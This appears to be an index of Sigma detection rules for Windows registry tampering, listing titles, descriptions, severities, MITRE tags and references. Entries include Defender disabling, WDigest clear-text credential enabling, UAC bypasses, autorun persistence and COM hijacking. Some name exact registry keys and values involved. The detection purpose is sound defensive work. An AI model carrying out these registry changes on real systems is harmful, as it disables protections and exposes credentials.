### Windows Defender Real-Time Protection Disabled
    
    Detects disabling Windows Defender Real-Time Protection by modifying registry

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_defender_realtime_protection_disabled.yml
* https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/

* https://gist.github.com/anadr/7465a9fde63d41341136949f14c21105

    
### Wdigest Enable UseLogonCredential
    
    Detects potential malicious modification of the property value of UseLogonCredential from HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest to enable clear-text credentials

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_wdigest_enable_uselogoncredential.yml
* https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html

* https://support.microsoft.com/en-us/topic/microsoft-security-advisory-update-to-improve-credentials-protection-and-management-may-13-2014-93434251-04ac-b7f3-52aa-9f951c14b649

    
### UAC Bypass Abusing Winsat Path Parsing - Registry
    
    Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_uac_bypass_winsat.yml
* https://github.com/hfiref0x/UACME

    
### Bypass UAC Using SilentCleanup Task
    
    There is an auto-elevated task called SilentCleanup located in %windir%\system32\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-9---bypass-uac-using-silentcleanup-task

* https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/

    
### Disable Exploit Guard Network Protection on Windows Defender
    
    Detects disabling Windows Defender Exploit Guard Network Protection

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_disabled_exploit_guard_net_protection_on_ms_defender.yml
* https://www.tenforums.com/tutorials/105533-enable-disable-windows-defender-exploit-protection-settings.html

    
### IE Change Domain Zone
    
    Hides the file extension through modification of the registry

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1137
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_change_security_zones.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md#atomic-test-4---add-domain-to-trusted-sites-zone

* https://docs.microsoft.com/en-us/troubleshoot/developer/browsers/security-privacy/ie-security-zones-registry-entries

    
### Office Security Settings Changed
    
    Detects registry changes to Office macro settings. The TrustRecords contain information on executed macro-enabled documents. (see references)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_office_security.yml
* https://twitter.com/inversecos/status/1494174785621819397

* https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/

* https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/

    
### Modification of IE Registry Settings
    
    Detects the modification of the registry settings used for Internet Explorer and other Windows components that use these settings

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_ie_persistence.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md#atomic-test-5---javascript-in-registry

    
### ServiceDll Modification
    
    Detects the modification of a ServiceDLL value in the service settings

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1543.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_set_servicedll.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md#atomic-test-4---tinyturla-backdoor-service-w64time

    
### CurrentVersion NT Autorun Keys Modification
    
    Detects modification of autostart extensibility point (ASEP) in registry.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_currentversion_nt.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md

* https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns

* https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d

    
### CobaltStrike Service Installations in Registry
    
    Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement. We can also catch this by system log 7045 (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_cobaltstrike_service_installs.yml) In some SIEM you can catch those events also in HKLM\System\ControlSet001\Services or HKLM\System\ControlSet002\Services, however, this rule is based on a regular sysmon's events.

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.privilege_escalation
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    * MITRE: attack.t1543.003
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_cobaltstrike_service_installs.yml
* https://www.sans.org/webcasts/tech-tuesday-workshop-cobalt-strike-detection-log-analysis-119395

    
### Execution DLL of Choice Using WAB.EXE
    
    This rule detects that the path to the DLL written in the registry is different from the default one. Launched WAB.exe tries to load the DLL from Registry.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_wab_dllpath_reg_change.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wab.yml

* https://twitter.com/Hexacorn/status/991447379864932352

* http://www.hexacorn.com/blog/2018/05/01/wab-exe-as-a-lolbin/

    
### Outlook C2 Registry Key
    
    Detects the modification of Outlook Security Setting to allow unprompted execution. Goes with win_outlook_c2_macro_creation.yml and is particularly interesting if both events occur near to each other.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.command_and_control
    * MITRE: attack.t1137
    * MITRE: attack.t1008
    * MITRE: attack.t1546
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_outlook_c2_registry_key.yml
* https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/

    
### New RUN Key Pointing to Suspicious Folder
    
    Detects suspicious new RUN key element pointing to an executable in a suspicious folder

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_susp_run_key_img_folder.yml
* https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html

    
### New File Association Using Exefile
    
    Detects the abuse of the exefile handler in new file association. Used for bypass of security products.

    * Level: high
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_file_association_exefile.yml
* https://twitter.com/mrd0x/status/1461041276514623491

    
### New Application in AppCompat
    
    A General detection for a new application in AppCompat. This indicates an application executing for the first time on an endpoint.

    * Level: informational
    * MITRE: attack.execution
    * MITRE: attack.t1204.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_new_application_appcompat.yml
* https://github.com/OTRF/detection-hackathon-apt29/issues/1

* https://threathunterplaybook.com/evals/apt29/detections/1.A.1_DFD6A782-9BDB-4550-AB6B-525E825B095E.html

    
### Service Binary in Suspicious Folder
    
    Detect the creation of a service with a service binary located in a suspicious directory

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_creation_service_susp_folder.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

    
### Common Autorun Keys Modification
    
    Detects modification of autostart extensibility point (ASEP) in registry.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_common.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md

* https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns

* https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d

    
### RDP Registry Modification
    
    Detects potential malicious modification of the property value of fDenyTSConnections and UserAuthentication to enable remote desktop connections.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_rdp_registry_modification.yml
* https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-190407183310.html

    
### Adwind RAT / JRAT
    
    Detects javaw.exe in AppData folder as used by Adwind / JRAT

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.005
    * MITRE: attack.t1059.007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_mal_adwind.yml
* https://www.hybrid-analysis.com/sample/ba86fa0d4b6af2db0656a88b1dd29f36fe362473ae8ad04255c4e52f214a541c?environmentId=100

* https://www.first.org/resources/papers/conf2017/Advanced-Incident-Detection-and-Threat-Hunting-using-Sysmon-and-Splunk.pdf

    
### Windows Registry Persistence COM Search Order Hijacking
    
    Detects potential COM object hijacking leveraging the COM Search Order

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1546.015
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_persistence_search_order.yml
* https://www.cyberbit.com/blog/endpoint-security/com-hijacking-windows-overlooked-security-vulnerability/

* https://attack.mitre.org/techniques/T1546/015/

    
### Scheduled TaskCache Change by Uncommon Program
    
    Monitor the creation of a new key under 'TaskCache' when a new scheduled task is registered by a process that is not svchost.exe, which is suspicious

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1053
    * MITRE: attack.t1053.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_taskcache_entry.yml
* https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/

* https://labs.f-secure.com/blog/scheduled-task-tampering/

    
### Wow6432Node CurrentVersion Autorun Keys Modification
    
    Detects modification of autostart extensibility point (ASEP) in registry.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_wow6432node.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md

* https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns

* https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d

    
### CurrentVersion Autorun Keys Modification
    
    Detects modification of autostart extensibility point (ASEP) in registry.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_currentversion.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md

* https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns

* https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d

    
### Suspicious Keyboard Layout Load
    
    Detects the keyboard preload installation with a suspicious keyboard layout, e.g. Chinese, Iranian or Vietnamese layout load in user session on systems maintained by US staff only

    * Level: medium
    * MITRE: attack.resource_development
    * MITRE: attack.t1588.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_susp_keyboard_layout_load.yml
* https://renenyffenegger.ch/notes/Windows/registry/tree/HKEY_CURRENT_USER/Keyboard-Layout/Preload/index

* https://github.com/SwiftOnSecurity/sysmon-config/pull/92/files

    
### UAC Bypass Using Windows Media Player - Registry
    
    Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_uac_bypass_wmp.yml
* https://github.com/hfiref0x/UACME

    
### New Root or CA or AuthRoot Certificate to Store
    
    Detects the addition of new root, CA or AuthRoot certificates to the Windows registry

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1490
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_install_root_or_ca_certificat.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.004/T1553.004.md#atomic-test-6---add-root-certificate-to-currentuser-certificate-store

* https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec

    
### PowerShell as a Service in Registry
    
    Detects that a powershell code is written to the registry as a service.

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_powershell_as_service.yml
* https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse

    
### Persistent Outlook Landing Pages
    
    Detects the manipulation of persistent URLs which could execute malicious code

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_outlook_registry_todaypage.yml
* https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=70

    
### Powershell in Windows Run Keys
    
    Adds a RUN key that contains a powershell keyword

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_powershell_in_run_keys.yml
* https://github.com/frack113/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md#atomic-test-9---systembc-malware-as-a-service-registry

    
### Windows Defender Exclusions Added
    
    Detects the Setting of Windows Defender Exclusions

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_defender_exclusions.yml
* https://twitter.com/_nullbind/status/1204923340810543109

    
### Registry Explorer Policy Modification
    
    Detects registry modifications that disable internal tools or functions in explorer (malware like Agent Tesla uses this technique)

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_set_nopolicies_user.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md

    
### DHCP Callout DLL Installation
    
    Detects the installation of a Callout DLL via CalloutDlls and CalloutEnabled parameter in Registry, which can be used to execute code in context of the DHCP server (restart required)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.002
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_dhcp_calloutdll.yml
* https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html

* https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx

* https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx

    
### Disable Administrative Share Creation at Startup
    
    Administrative shares are hidden network shares created by Microsoft’s Windows NT operating systems that grant system administrators remote access to every disk volume on a network-connected system

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_disable_administrative_share.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.005/T1070.005.md#atomic-test-4---disable-administrative-share-creation-at-startup

    
### System Scripts Autorun Keys Modification
    
    Detects modification of autostart extensibility point (ASEP) in registry.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_system_scripts.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md

* https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns

* https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d

    
### CurrentControlSet Autorun Keys Modification
    
    Detects modification of autostart extensibility point (ASEP) in registry.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_currentcontrolset.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md

* https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns

* https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d

    
### Registry Persistence Mechanism via Windows Telemetry
    
    Detects persistence method using windows telemetry

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1053.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_telemetry_persistence.yml
* https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/

    
### DNS-over-HTTPS Enabled by Registry
    
    Detects when a user enables DNS-over-HTTPS. This can be used to hide internet activity or be used to hide the process of exfiltrating data. With this enabled organization will lose visibility into data such as query type, response and originating IP that are used to determine bad actors.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1140
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_dns_over_https_enabled.yml
* https://www.tenforums.com/tutorials/151318-how-enable-disable-dns-over-https-doh-microsoft-edge.html

* https://github.com/elastic/detection-rules/issues/1371

* https://chromeenterprise.google/policies/?policy=DnsOverHttpsMode

* https://admx.help/HKLM/Software/Policies/Mozilla/Firefox/DNSOverHTTPS

    
### Change Outlook Security Setting in Registry
    
    Change outlook email security settings

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1137
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_outlook_security.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137/T1137.md

* https://docs.microsoft.com/en-us/outlook/troubleshoot/security/information-about-email-security-settings

    
### Persistent Outlook Landing Pages
    
    Detects the manipulation of persistent URLs which can be malicious

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_outlook_registry_webview.yml
* https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=70

* https://support.microsoft.com/en-us/topic/outlook-home-page-feature-is-missing-in-folder-properties-d207edb7-aa02-46c5-b608-5d9dbed9bd04?ui=en-us&rs=en-us&ad=us

    
### Add Port Monitor Persistence in Registry
    
    Adversaries may use port monitors to run an attacker supplied DLL during system boot for persistence or privilege escalation.
A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup.


    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1547.010
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_add_port_monitor.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.010/T1547.010.md

    
### Bypass UAC Using DelegateExecute
    
    Bypasses User Account Control using a fileless method

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_bypass_uac_using_delegateexecute.yml
* https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-iexecutecommand

* https://devblogs.microsoft.com/oldnewthing/20100312-01/?p=14623

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-7---bypass-uac-using-sdclt-delegateexecute

    
### Enabling COR Profiler Environment Variables
    
    This rule detects cor_enable_profiling and cor_profiler environment variables being set and configured.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.012
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_enabling_cor_profiler_env_variables.yml
* https://twitter.com/jamieantisocial/status/1304520651248668673

* https://www.slideshare.net/JamieWilliams130/started-from-the-bottom-exploiting-data-sources-to-uncover-attck-behaviors

* https://www.sans.org/cyber-security-summit/archives

    
### ScreenSaver Registry Key Set
    
    Detects registry key established after masqueraded .scr file execution using Rundll32 through desk.cpl

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_scr_file_executed_by_rundll32.yml
* https://twitter.com/VakninHai/status/1517027824984547329

* https://twitter.com/pabraeken/status/998627081360695297

* https://jstnk9.github.io/jstnk9/research/InstallScreenSaver-SCR-files

    
### Blue Mockingbird
    
    Attempts to detect system changes made by Blue Mockingbird

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1112
    * MITRE: attack.t1047
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_mal_blue_mockingbird.yml
* https://redcanary.com/blog/blue-mockingbird-cryptominer/

    
### Windows Defender Threat Detection Disabled - Registry
    
    Detects disabling Windows Defender threat protection

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_defender_disabled.yml
* https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-test/troubleshoot-windows-defender-test

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

* https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/

    
### VBScript Payload Stored in Registry
    
    Detects VBScript content stored into registry keys as seen being used by UNC2452 group

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_vbs_payload_stored.yml
* https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/

    
### Classes Autorun Keys Modification
    
    Detects modification of autostart extensibility point (ASEP) in registry.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_classes.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md

* https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns

* https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d

    
### Registry Persistence via Explorer Run Key
    
    Detects a possible persistence mechanism using RUN key for Windows Explorer and pointing to a suspicious folder

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_susp_reg_persist_explorer_run.yml
* https://researchcenter.paloaltonetworks.com/2018/07/unit42-upatre-continues-evolve-new-anti-analysis-techniques/

    
### RDP Sensitive Settings Changed
    
    Detects changes to RDP terminal service sensitive settings

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_rdp_settings_hijack.yml
* https://blog.menasec.net/2019/02/threat-hunting-rdp-hijacking-via.html

* https://knowledge.insourcess.com/Supporting_Technologies/Wonderware/Tech_Notes/TN_WW213_How_to_shadow_an_established_RDP_Session_on_Windows_10_Pro

* https://twitter.com/SagieSec/status/1469001618863624194?t=HRf0eA0W1YYzkTSHb-Ky1A&s=03

* http://etutorials.org/Microsoft+Products/microsoft+windows+server+2003+terminal+services/Chapter+6+Registry/Registry+Keys+for+Terminal+Services/

    
### Wow6432Node Classes Autorun Keys Modification
    
    Detects modification of autostart extensibility point (ASEP) in registry.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_wow6432node_classes.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md

* https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns

* https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d

    
### Disable Internal Tools or Feature in Registry
    
    Detects registry modifications that change features of internal Windows tools (malware like Agent Tesla uses this technique)

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_disable_fonction_user.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md

    
### Modification of Explorer Hidden Keys
    
    Detects modifications to the hidden files keys in registry. This technique is abused by several malware families to hide their files from normal users.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_hide_file.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.001/T1564.001.md#atomic-test-8---hide-files-through-registry

    
### SilentProcessExit Monitor Registrytion
    
    Detects changes to the Registry in which a monitor program gets registered to monitor the exit of another process

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1546.012
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_silentprocessexit.yml
* https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/

* https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/

    
### Bypass UAC Using Event Viewer
    
    Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1547.010
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_bypass_uac_using_eventviewer.yml
* https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-1---bypass-uac-using-event-viewer-cmd

    
### Disable UAC Using Registry
    
    Disable User Account Conrol (UAC) by changing its registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA from 1 to 0

    * Level: medium
    * MITRE: attack.privilege_escalation
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_disable_uac_registry.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-8---disable-uac-using-regexe

    
### COM Hijack via Sdclt
    
    Detects changes to 'HKCU\Software\Classes\Folder\shell\open\command\DelegateExecute'

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1546
    * MITRE: attack.t1548
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_comhijack_sdclt.yml
* http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass

* https://www.exploit-db.com/exploits/47696

    
### Abusing Windows Telemetry For Persistence
    
    Windows telemetry makes use of the binary CompatTelRunner.exe to run a variety of commands and perform the actual telemetry collections. This binary was created to be easily extensible, and to that end, it relies on the registry to instruct on which commands to run. The problem is, it will run any arbitrary command without restriction of location or type.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.persistence
    * MITRE: attack.t1112
    * MITRE: attack.t1053
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_abusing_windows_telemetry_for_persistence.yml
* https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/

    
### Pandemic Registry Key
    
    Detects Pandemic Windows Implant

    * Level: critical
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_apt_pandemic.yml
* https://wikileaks.org/vault7/#Pandemic

* https://twitter.com/MalwareJake/status/870349480356454401

    
### Registry Persistence Mechanisms in Recycle Bin
    
    Detects persistence registry keys for Recycle Bin

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1547
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_persistence_recycle_bin.yml
